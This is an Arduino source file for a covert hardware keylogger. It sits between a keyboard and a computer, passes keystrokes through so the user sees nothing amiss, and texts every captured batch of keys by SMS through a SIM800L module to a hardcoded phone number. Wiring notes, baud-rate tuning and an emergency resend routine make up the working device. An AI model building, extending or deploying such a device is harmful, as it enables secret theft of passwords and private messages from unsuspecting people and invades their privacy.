// make sure to copy whole folder, not just this sketch

#include <SoftwareSerial.h>             // library required for serial communication using almost(!) any Digital I/O pins of Arduino
#include <Keyboard.h>                   // library that contains all the HID functionality necessary to pass-on the typed and logged keys to the PC
#include "C_USBhost.h"                  // class used to make the code more clear
#include "C_Sim800L.h"                  // same

/*
    The wiring of Sim800L could be flexible because it relies on SoftwareSerial. But keep in mind that: 
    "Not all pins on the Leonardo and Micro support change interrupts, so only the following 
    can be used for RX: 8, 9, 10, 11, 14 (MISO), 15 (SCK), 16 (MOSI)". (see: https://www.arduino.cc/en/Reference/SoftwareSerial)
    
    The following lines are responsible for wiring:
*/

C_Sim800L Sim800L = C_Sim800L(/*softwareSerial RX*/8, /*softwareSerial TX*/9, /*resetPin*/10, /*debug_state*/false);             //communication with sim800L (software serial pins)
C_USBhost USBhost = C_USBhost(Serial1, /*debug_state*/false);            // communication with USB host board (receiving input from keyboard), connected to RX/TX of Arduino Pro Micro
#define SIM800L_RESET_PIN 10            // digital Arduino pin connected to RST of Sim800L

/*
    The wiring used with the lines above is:
    [ Pro Micro 5V   ->  sim800L ]
                8    ->  SIM_TXD
                9    ->  SIM_RXD
                VCC  ->  5V
                GND  ->  GND
            2nd GND  ->  2nd GND

                        "collector" leg -----> RST
                              |   
      10 -> 1K res -> NPN transistor "base" leg (e.g. BD137)  (see this link and notice direction of NPN transistor and reference: http://exploreembedded.com/wiki/GSM_SIM800L_Sheild_with_Arduino)
                              | 
                        "emitter" leg   -----> GND

    
    [ Pro Micro 5V   ->   Usb Host Mini Board ]   // Vertical lines indicate that the connection is made on the same module
              GND    ->    0V (GND)
                              |
                         4.7K resistor
                              |
                             RX
                             
              RX    ->    TX
              TX    ->    2K resistor -> RX
             RAW    ->    5V   

    Possible design (don't use for wiring reference, it changed since this picture):                                              
    https://cdn.discordapp.com/attachments/417291555146039297/417340199379533824/b.jpg
    https://cdn.discordapp.com/attachments/417291555146039297/417340239942778880/c.jpg
    
    Make sure to read the comments below regarding sim800L baud rate. It has essential information required to make it work.
    
    The code sends "MODE 6" to the USB host board in order to receive raw HID data, don't worry if it changes what is received from 
    the board (if you're using it for other projects) and just send "MODE 0" command to it by for example changing the "USBhost.println("MODE 6")" line below 
    and running the code once.
*/

/* SETTINGS */
#define PHONE_RECEIVER_NUMBER "+44999999999"
#define CHAR_LIMIT 140                                // number of characters before it sends sms (shouldn't be more than 150)
/* 
    The serial connection speed below (for the SIM800L) heavily impacts how fast the sms are sent. The higher value = the faster speed.
    The default baud rate of sim800L appears to be 9600. It could be changed by sending AT+IPR=<rate> command. Possible values of the sim800L 
    baud rates compatible with Arduino Pro Micro are: 1200, 2400, 4800, 9600, 19200, 38400, 57600, 115200. If you look at the original 
    version that uses Teensy it has it set to 115200, I'm not aware of the reliability of it for Teensy because I never tested it but for 
    the Arduino Pro Micro 115200 baud rate was unreliable for me and resulted in slightly "gibberish" output. 38400 worked fine (AT+IPR=38400 command).
    57600 apeared to be the highest reliable frequency compatible between these 2 boards during my test but it's also the weirdest one...
    Twice I used AT+IPR=57600 command and twice it set it to 57700... Keep that in mind if you do the same, because if I didn't notice the response which 
    said 57700 instead of 57600 I would probably assume that I have to look for some way to revert it to orginal settings through some reset, just because it 
    set the baud rate to incorrect value. (even the datasheet says that it supports 57600 but in practice it changed it to 57700...)
    Using 57700 baud rate 140 characters long sms takes around 50ms to send (0.05 of a second).
*/
#define BAUD_RATE_SIM800L 57700                      // default is 9600 so send AT+IPR=57700 to it through serial monitor
#define BAUD_RATE_USB_HOST_BOARD 115200              // default was 9600, it was changed by: "BAUD 115200" command (ended by "carriage return", see bottom-right corner of serial monitor)
#define BAUD_RATE_SERIAL 115200                      // usually 9600 is used but because of the USBhost and Sim800L serials being faster it's also set to higher value (to prevent it interrupting their work by any chance)
//#define SERIAL_DEBUG false                            // I'd recommend set it false before deploying the device, use it for testing and observing Serial Monitor only
/* END OF SETTINGS */

char TextSms[CHAR_LIMIT+2];                   // + 2 for the last confirming byte sim800L requires to either confirm (byte 26) or discard (byte 27) new sms message
int char_count;                               // how many characters were "collected" since turning device on (or since last sms was sent)

bool smsFailed = false;
unsigned long failedSmsTime;
char backupTextSms[CHAR_LIMIT+2];
byte backupCharCount = 0;
byte emergencySmsRoutineStep = 0;
bool smsWasSent = false;
unsigned long smsSendingTime;


void setup() {
  delay(1000);                                                // probably useless, but it allows some time for the USB host board and Sim800L to initialize 
  
  Serial.begin(BAUD_RATE_SERIAL);                             // begin serial communication with PC (so Serial Monitor could be opened and the developer could see what is actually going on in the code)                          

  Sim800L.Begin(BAUD_RATE_SIM800L);                           // begin serial communication with the sim800L module to let it know (later) to send an sms 
  Sim800L.SetSmsResponseCollectionDelay(8000);					      // it can't be collected straight after sending because Sim800L provides response after around 5 seconds
  Sim800L.SendCmd("AT+CMGF=1\r\n", "OK");                     // AT+CMGF command sets the sms mode to "text" (see 113th page of https://www.elecrow.com/download/SIM800%20Series_AT%20Command%20Manual_V1.09.pdf)
  
  USBhost.Begin(BAUD_RATE_USB_HOST_BOARD);                    // begin serial communication with USB host board in order to receive key bytes from the keyboard connected to it
  USBhost.SetMode('6');
  
  Keyboard.begin();                                           // start HID functionality, it will allow to type keys to the PC just as if there was no keylogger at all
  pinMode(SIM800L_RESET_PIN, OUTPUT);
  digitalWrite(SIM800L_RESET_PIN, LOW);
}



void loop() {
  byte b = USBhost.GetKey();                                         // function responsible for collecting, storing keystrokes from USB host board, it also is typing keystrokes to PC 
  if(b){
    TextSms[char_count++] = (char)b;
    if (char_count == CHAR_LIMIT - 1) {
      TextSms[char_count] = 0;
      if(Sim800L.SendSms(PHONE_RECEIVER_NUMBER, TextSms)){    // function responsible for sending sms (+ release all buttons if message is going to be sent) 3rd parameter is making sure
        char_count = 0;
        smsWasSent = true;
        smsSendingTime = millis();
        //Serial.print(F("loop - smsSendingTime: ")); Serial.println(smsSendingTime);
      }
      else{
        smsFailed = true;
    		for(byte i=0; i<=char_count; i++){
    			backupTextSms[i] = TextSms[i];
    		}
    		backupCharCount = char_count;
    		char_count = 0;
      }
    }
  }

  
  if(smsFailed){
    if(Sim800L.EmergencySmsRoutine(PHONE_RECEIVER_NUMBER, backupTextSms)){                                      // if sms couldn't be sent then reset/reboot Sim800L and try sending sms again, do it without interrupting HID data collection hence this "emergency routine" exists
  		smsFailed = false; 
  		smsWasSent = true;
      smsSendingTime = millis();
  		//Serial.print(F("loop Sim800L.EmergencySmsRoutine - smsSendingTime: ")); Serial.println(smsSendingTime);
	  }
  }
  
  if(smsWasSent){
    Sim800L.ReadSerialBuffer();                                   // to avoid it being full (it's only 64 bytes), it's actually not necessary but it was implemented because Sim800L returns all the chars that were sent to it... It is useless a little because these chars are ignored straight away instead but it could stay as a protection in case if Sim800L tries to send much larger message as usual, this function progressively reads the serial buffer and stores the chars in a larger one.
    if(Sim800L.CheckDelayedSmsResponse(smsSendingTime)){
      smsWasSent = 0;                                             // reset variable because response was received (or abandoned if nothing was received)
    }
  }
}






